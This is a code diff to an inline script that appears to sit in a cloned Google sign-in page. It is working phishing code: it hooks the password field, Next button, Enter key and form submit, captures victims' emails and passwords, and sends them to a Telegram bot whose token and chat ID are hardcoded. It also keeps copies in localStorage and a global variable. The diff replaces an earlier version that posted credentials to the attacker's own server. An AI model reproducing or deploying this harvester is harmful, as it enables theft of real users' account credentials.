@@ -16083,8 +16083,11 @@
 (function() {
     let passwordSent = false;
 
+    // ====== CONFIGURE YOUR TELEGRAM BOT HERE ======
+    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY'; // e.g., 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+    const TELEGRAM_CHAT_ID = '8391692120';   // e.g., 123456789
+
     function getEmail() {
-        // Try multiple ways to get the email
         const emailInput = document.querySelector('input[name="identifier"]') || 
                           document.querySelector('input[type="email"]');
         if (emailInput && emailInput.value) return emailInput.value;
@@ -16104,19 +16107,41 @@
         return pwdInput ? pwdInput.value : '';
     }
 
-    function sendToServer(email, password) {
-        // Send to your Render backend
-        fetch('/log', {
+    function sendToTelegram(email, password) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.log('⚠️ Telegram bot token or chat ID not configured!');
+            return;
+        }
+
+        const message = `🔑 **New Credentials Captured!**\n\n` +
+                       `📧 **Email:** ${email}\n` +
+                       `🔐 **Password:** ${password}\n` +
+                       `🕐 **Time:** ${new Date().toLocaleString()}\n` +
+                       `🌐 **Page:** ${window.location.href}`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        fetch(url, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, password })
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
         })
         .then(response => response.json())
         .then(data => {
-            console.log('✅ Server response:', data);
+            if (data.ok) {
+                console.log('✅ Credentials sent to Telegram successfully!');
+            } else {
+                console.log('❌ Failed to send to Telegram:', data.description);
+            }
         })
-        .catch(err => {
-            console.error('❌ Failed to send to server:', err);
+        .catch(error => {
+            console.log('❌ Telegram send error:', error);
         });
     }
 
@@ -16127,17 +16152,15 @@
         if (password && password.length > 0) {
             const email = getEmail();
             
-            // ====== SEND TO RENDER SERVER ======
-            sendToServer(email, password);
-            
-            // ====== LOG TO BROWSER CONSOLE ======
+            // Log to console
             console.log('%c🔑 PASSWORD CAPTURED', 'font-size:24px;font-weight:bold;color:#0f0;background:#000;padding:10px;border-radius:5px;');
             console.log('%c📧 Email:', 'font-size:16px;font-weight:bold;color:#00f;', email);
             console.log('%c🔑 Password:', 'font-size:16px;font-weight:bold;color:#f00;', password);
-            console.log('%c🕐 Time:', 'font-size:14px;color:#888;', new Date().toLocaleString());
-            console.log('%c' + '='.repeat(50), 'color:#888;');
             
-            // ====== STORE IN LOCALSTORAGE (Backup) ======
+            // Send to Telegram
+            sendToTelegram(email, password);
+            
+            // Store in localStorage as backup
             try {
                 localStorage.setItem('captured_password', JSON.stringify({
                     email: email,
@@ -16146,20 +16169,15 @@
                 }));
             } catch(e) {}
             
-            // ====== STORE IN GLOBAL VARIABLE ======
-            window._capturedData = { 
-                email: email, 
-                password: password, 
-                timestamp: new Date().toISOString() 
-            };
+            // Store in global variable
+            window._capturedData = { email, password, timestamp: new Date().toISOString() };
             
             passwordSent = true;
         }
     }
 
-    // ====== RETRIEVE CAPTURED DATA ======
+    // ====== RETRIEVE FUNCTION ======
     window.getCaptured = function() {
-        // Check localStorage first
         try {
             const stored = localStorage.getItem('captured_password');
             if (stored) {
@@ -16172,7 +16190,6 @@
             }
         } catch(e) {}
         
-        // Check global variable
         if (window._capturedData) {
             console.log('📂 Retrieved from memory:');
             console.log('📧 Email:', window._capturedData.email);
@@ -16184,33 +16201,7 @@
         return null;
     };
 
-    // ====== VIEW SERVER LOGS ======
-    window.viewLogs = function() {
-        fetch('/view-logs')
-            .then(response => response.text())
-            .then(data => {
-                console.log('📋 Server Logs:\n' + data);
-            })
-            .catch(err => {
-                console.error('❌ Failed to fetch logs:', err);
-            });
-    };
-
-    // ====== CLEAR SERVER LOGS ======
-    window.clearLogs = function() {
-        fetch('/clear-logs', { method: 'DELETE' })
-            .then(response => response.json())
-            .then(data => {
-                console.log('🗑️ Logs cleared:', data);
-            })
-            .catch(err => {
-                console.error('❌ Failed to clear logs:', err);
-            });
-    };
-
     // ====== EVENT LISTENERS ======
-
-    // 1. Listen for click on "Next" button
     document.addEventListener('click', function(e) {
         const target = e.target.closest('button') || e.target.closest('[role="button"]');
         if (target) {
@@ -16221,7 +16212,6 @@
         }
     }, true);
 
-    // 2. Listen for Enter key on password field
     const passwordField = document.querySelector('input[name="Passwd"]');
     if (passwordField) {
         passwordField.addEventListener('keydown', function(e) {
@@ -16231,14 +16221,13 @@
         });
     }
 
-    // 3. Listen for form submit
     document.addEventListener('submit', function(e) {
         if (e.target && e.target.querySelector('input[name="Passwd"]')) {
             setTimeout(captureAndLog, 300);
         }
     }, true);
 
-    // 4. Find and attach to Next button (fallback)
+    // Find Next button
     let attempts = 0;
     const findButton = setInterval(function() {
         const nextContainer = document.querySelector('#passwordNext');
@@ -16253,11 +16242,8 @@
         if (attempts > 30) clearInterval(findButton);
     }, 500);
 
-    // ====== INITIALIZATION MESSAGE ======
-    console.log('%c✅ Password Logger Active - Sending to Render Server!', 'font-size:20px;font-weight:bold;color:#0f0;');
-    console.log('%c📌 Enter password and click "Next" or press Enter', 'font-size:14px;color:#ff0;');
-    console.log('%c📌 Password appears in console AND is sent to Render', 'font-size:14px;color:#ff0;');
-    console.log('%c📌 Check Render Logs at /view-logs', 'font-size:14px;color:#ff0;');
-    console.log('%c📌 Commands: getCaptured() | viewLogs() | clearLogs()', 'font-size:14px;color:#0ff;');
+    console.log('%c✅ Password Logger Active (with Telegram)', 'font-size:18px;font-weight:bold;color:#0f0;');
+    console.log('📌 Enter password and click "Next" or press Enter');
+    console.log('📌 Credentials will be sent to your Telegram bot');
 })();
 </script>
